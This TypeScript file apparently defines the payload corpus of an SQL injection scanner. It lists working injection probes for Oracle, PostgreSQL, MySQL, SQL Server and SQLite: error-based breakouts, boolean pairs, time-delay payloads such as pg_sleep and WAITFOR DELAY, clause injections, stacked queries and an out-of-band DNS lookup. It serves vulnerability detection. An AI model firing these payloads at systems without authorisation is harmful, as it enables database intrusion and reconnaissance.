import { PayloadResearchItem, InjectionContext, DbmsType, InjectionType } from '../../types/sqlScanner';

export class PayloadResearchCorpus {
  public static CORPUS_VERSION = '2026.4-ENTERPRISE';

  private static ITEMS: PayloadResearchItem[] = [
    // ----------------------------------------------------
    // 1. Error-Based Syntactic Breakout Probes
    // ----------------------------------------------------
    {
      id: 'ERR_GEN_001',
      name: 'Single Quote Delimiter',
      dbms: 'Generic SQL',
      context: 'single_quote_string',
      technique: 'Error-based',
      payload: "'",
      expectedBehavior: 'Unclosed quotation mark or syntax error near quote',
      negativeBehavior: 'Normal status code 200 without error signatures',
      riskLevel: 'Safe',
      version: '2026.4',
    },
    {
      id: 'ERR_GEN_002',
      name: 'Double Quote Delimiter',
      dbms: 'Generic SQL',
      context: 'double_quote_string',
      technique: 'Error-based',
      payload: '"',
      expectedBehavior: 'Unclosed string or identifier syntax error',
      negativeBehavior: 'Normal response body',
      riskLevel: 'Safe',
      version: '2026.4',
    },
    {
      id: 'ERR_GEN_003',
      name: 'Parenthesis & Quote Breakout',
      dbms: 'Generic SQL',
      context: 'parenthesized_string',
      technique: 'Error-based',
      payload: "')",
      expectedBehavior: 'Mismatched parenthesis or parser error',
      negativeBehavior: 'Identical baseline response',
      riskLevel: 'Safe',
      version: '2026.4',
    },
    {
      id: 'ERR_GEN_004',
      name: 'Backslash Escape Character',
      dbms: 'Generic SQL',
      context: 'single_quote_string',
      technique: 'Error-based',
      payload: '\\',
      expectedBehavior: 'Escape syntax error or unclosed string quote',
      negativeBehavior: 'Normal response body',
      riskLevel: 'Safe',
      version: '2026.4',
    },
    {
      id: 'ERR_ORA_001',
      name: 'Oracle Unterminated String (ORA-01756)',
      dbms: 'Oracle',
      context: 'single_quote_string',
      technique: 'Error-based',
      payload: "'||(SELECT '' FROM DUAL)||'",
      expectedBehavior: 'Oracle SQL execution or ORA-01756 error',
      negativeBehavior: 'No ORA signatures',
      riskLevel: 'Safe',
      version: '2026.4',
    },
    {
      id: 'ERR_ORA_002',
      name: 'Oracle XMLType Syntax Error',
      dbms: 'Oracle',
      context: 'single_quote_string',
      technique: 'Error-based',
      payload: "' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'SNT_ERR'||CHR(62))) FROM DUAL)--",
      expectedBehavior: 'ORA-31011 XML parsing error or ORA-00933',
      negativeBehavior: 'No ORA signatures',
      riskLevel: 'Safe',
      version: '2026.4',
    },
    {
      id: 'ERR_PG_001',
      name: 'Postgres Cast Syntax Error',
      dbms: 'PostgreSQL',
      context: 'numeric',
      technique: 'Error-based',
      payload: '::int',
      expectedBehavior: 'Postgres type cast or syntax error at or near ::',
      negativeBehavior: 'Normal query behavior',
      riskLevel: 'Safe',
      version: '2026.4',
    },
    {
      id: 'ERR_MYS_001',
      name: 'MySQL EXTRACTVALUE Error',
      dbms: 'MySQL',
      context: 'single_quote_string',
      technique: 'Error-based',
      payload: "' AND EXTRACTVALUE(1, CONCAT(0x7e, 'SNT_ERR'))-- -",
      expectedBehavior: 'XPATH syntax error: ~SNT_ERR',
      negativeBehavior: 'No syntax error',
      riskLevel: 'Safe',
      version: '2026.4',
    },
    {
      id: 'ERR_MSS_001',
      name: 'MSSQL Type Conversion Error',
      dbms: 'Microsoft SQL Server',
      context: 'single_quote_string',
      technique: 'Error-based',
      payload: "' AND 1=CONVERT(INT, 'SNT_ERR')--",
      expectedBehavior: 'Conversion failed when converting the varchar value SNT_ERR to data type int',
      negativeBehavior: 'Normal response',
      riskLevel: 'Safe',
      version: '2026.4',
    },

    // ----------------------------------------------------
    // 2. Boolean-Based Differential Pairs
    // ----------------------------------------------------
    {
      id: 'BOOL_STR_001',
      name: 'Single Quote String Equality Pair',
      dbms: 'Generic SQL',
      context: 'single_quote_string',
      technique: 'Boolean-based',
      payload: "' AND '1'='1",
      expectedBehavior: 'TRUE response identical to baseline',
      negativeBehavior: 'FALSE response diverges significantly',
      riskLevel: 'Safe',
      version: '2026.4',
    },
    {
      id: 'BOOL_STR_002',
      name: 'Single Quote Commented Boolean Pair',
      dbms: 'Generic SQL',
      context: 'single_quote_string',
      technique: 'Boolean-based',
      payload: "' AND 1=1-- -",
      expectedBehavior: 'TRUE response identical to baseline',
      negativeBehavior: 'FALSE response diverges',
      riskLevel: 'Safe',
      version: '2026.4',
    },
    {
      id: 'BOOL_NUM_001',
      name: 'Numeric AND Logic Pair',
      dbms: 'Generic SQL',
      context: 'numeric',
      technique: 'Boolean-based',
      payload: ' AND 1337=1337',
      expectedBehavior: 'Normal baseline output on TRUE condition',
      negativeBehavior: 'Empty or different content on FALSE condition (AND 1337=1338)',
      riskLevel: 'Safe',
      version: '2026.4',
    },
    {
      id: 'BOOL_ORA_001',
      name: 'Oracle DUAL Table Verification',
      dbms: 'Oracle',
      context: 'single_quote_string',
      technique: 'Boolean-based',
      payload: "' AND (SELECT 1 FROM DUAL)=1 AND '1'='1",
      expectedBehavior: 'Oracle DUAL evaluates TRUE without altering response',
      negativeBehavior: 'Evaluates FALSE if non-Oracle',
      riskLevel: 'Safe',
      version: '2026.4',
    },
    {
      id: 'BOOL_PG_001',
      name: 'PostgreSQL Cast Equality Test',
      dbms: 'PostgreSQL',
      context: 'single_quote_string',
      technique: 'Boolean-based',
      payload: "' AND 5::text=5::text AND 'a'='a",
      expectedBehavior: 'Evaluates TRUE on PostgreSQL database engines',
      negativeBehavior: 'Fails syntax on non-Postgres engines',
      riskLevel: 'Safe',
      version: '2026.4',
    },
    {
      id: 'BOOL_LIKE_001',
      name: 'LIKE Clause Wildcard Verification',
      dbms: 'Generic SQL',
      context: 'like_clause',
      technique: 'Boolean-based',
      payload: "%' AND 1=1 AND '%'='",
      expectedBehavior: 'Evaluates TRUE without breaking LIKE pattern',
      negativeBehavior: 'Diverges on %\' AND 1=2 AND \'%\'=\'',
      riskLevel: 'Safe',
      version: '2026.4',
    },

    // ----------------------------------------------------
    // 3. Time-Based Blind Delay Probes
    // ----------------------------------------------------
    {
      id: 'TIME_ORA_001',
      name: 'Oracle dbms_pipe.receive_message Delay',
      dbms: 'Oracle',
      context: 'single_quote_string',
      technique: 'Time-based',
      payload: "'||(SELECT dbms_pipe.receive_message(('RDS'),3) FROM DUAL)||'",
      expectedBehavior: 'Server execution pauses for ~3 seconds',
      negativeBehavior: 'Immediate response < baseline median + 500ms',
      riskLevel: 'Probe',
      version: '2026.4',
    },
    {
      id: 'TIME_PG_001',
      name: 'PostgreSQL pg_sleep Delay',
      dbms: 'PostgreSQL',
      context: 'single_quote_string',
      technique: 'Time-based',
      payload: "'||(SELECT pg_sleep(3))||'",
      expectedBehavior: 'Server pauses execution for 3 seconds',
      negativeBehavior: 'Immediate response',
      riskLevel: 'Probe',
      version: '2026.4',
    },
    {
      id: 'TIME_MYS_001',
      name: 'MySQL SLEEP() Delay',
      dbms: 'MySQL',
      context: 'single_quote_string',
      technique: 'Time-based',
      payload: "' AND (SELECT 1 FROM (SELECT(SLEEP(3)))snt)-- -",
      expectedBehavior: 'Execution delay of ~3000ms',
      negativeBehavior: 'Immediate response',
      riskLevel: 'Probe',
      version: '2026.4',
    },
    {
      id: 'TIME_MSS_001',
      name: 'MSSQL WAITFOR DELAY',
      dbms: 'Microsoft SQL Server',
      context: 'single_quote_string',
      technique: 'Time-based',
      payload: "'; WAITFOR DELAY '0:0:3'--",
      expectedBehavior: 'Execution delay of 3 seconds',
      negativeBehavior: 'Immediate response',
      riskLevel: 'Probe',
      version: '2026.4',
    },
    {
      id: 'TIME_SQLITE_001',
      name: 'SQLite CPU Heavy Delay',
      dbms: 'SQLite',
      context: 'single_quote_string',
      technique: 'Time-based',
      payload: "' AND (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000/2)))))-- -",
      expectedBehavior: 'Execution delay from intensive cryptographic blob hashing',
      negativeBehavior: 'Immediate response',
      riskLevel: 'Probe',
      version: '2026.4',
    },

    // ----------------------------------------------------
    // 4. ORDER BY & GROUP BY & HAVING Clause Breakouts
    // ----------------------------------------------------
    {
      id: 'ORD_GEN_001',
      name: 'ORDER BY Index Probing',
      dbms: 'Generic SQL',
      context: 'order_by_clause',
      technique: 'ORDER BY Injection',
      payload: "(CASE WHEN (1=1) THEN 1 ELSE 2 END)",
      expectedBehavior: 'Maintains valid sort ordering on TRUE',
      negativeBehavior: 'Alters ordering on FALSE',
      riskLevel: 'Safe',
      version: '2026.4',
    },
    {
      id: 'GRP_GEN_001',
      name: 'GROUP BY Clause Evaluation',
      dbms: 'Generic SQL',
      context: 'group_by_clause',
      technique: 'GROUP BY Injection',
      payload: "1,(CASE WHEN (1=1) THEN 1 ELSE 2 END)",
      expectedBehavior: 'Valid grouping on TRUE',
      negativeBehavior: 'Grouping syntax error on invalid index',
      riskLevel: 'Safe',
      version: '2026.4',
    },
    {
      id: 'HAV_GEN_001',
      name: 'HAVING Clause Boolean Evaluation',
      dbms: 'Generic SQL',
      context: 'having_clause',
      technique: 'HAVING Injection',
      payload: "1=1 AND 1337=1337",
      expectedBehavior: 'Normal output on TRUE',
      negativeBehavior: 'Empty result on FALSE (1=1 AND 1337=1338)',
      riskLevel: 'Safe',
      version: '2026.4',
    },

    // ----------------------------------------------------
    // 5. Stacked-Query Indicators
    // ----------------------------------------------------
    {
      id: 'STK_PG_001',
      name: 'PostgreSQL Stacked Query Sleep',
      dbms: 'PostgreSQL',
      context: 'single_quote_string',
      technique: 'Stacked-query indicator',
      payload: "'; SELECT pg_sleep(3);--",
      expectedBehavior: 'Multi-statement execution delay',
      negativeBehavior: 'Syntax error if multi-statements are unsupported',
      riskLevel: 'Probe',
      version: '2026.4',
    },
    {
      id: 'STK_MSS_001',
      name: 'MSSQL Stacked Query Delay',
      dbms: 'Microsoft SQL Server',
      context: 'single_quote_string',
      technique: 'Stacked-query indicator',
      payload: "'; WAITFOR DELAY '0:0:3'--",
      expectedBehavior: 'Multi-statement execution delay',
      negativeBehavior: 'Syntax error if stacked queries disabled',
      riskLevel: 'Probe',
      version: '2026.4',
    },

    // ----------------------------------------------------
    // 6. Out-of-Band (OAST) Simulation & Secondary Indicators
    // ----------------------------------------------------
    {
      id: 'OOB_ORA_001',
      name: 'Oracle UTL_INADDR Host Resolution',
      dbms: 'Oracle',
      context: 'single_quote_string',
      technique: 'Out-of-Band (OAST)',
      payload: "'||(SELECT UTL_INADDR.get_host_name('sentinel.local') FROM DUAL)||'",
      expectedBehavior: 'Host resolution lookup triggered',
      negativeBehavior: 'No DNS trigger',
      riskLevel: 'Informational',
      version: '2026.4',
    },
  ];

  public static getPayloads(options?: {
    dbms?: DbmsType;
    context?: InjectionContext;
    technique?: InjectionType;
  }): PayloadResearchItem[] {
    return PayloadResearchCorpus.ITEMS.filter((item) => {
      if (options?.dbms && options.dbms !== 'Generic SQL' && options.dbms !== 'Unknown' && item.dbms !== 'Generic SQL' && item.dbms !== options.dbms) {
        return false;
      }
      if (options?.context && options.context !== 'unknown' && item.context !== options.context && item.context !== 'single_quote_string') {
        return false;
      }
      if (options?.technique && item.technique !== options.technique) {
        return false;
      }
      return true;
    });
  }

  public static getAllPayloads(): PayloadResearchItem[] {
    return [...PayloadResearchCorpus.ITEMS];
  }
}
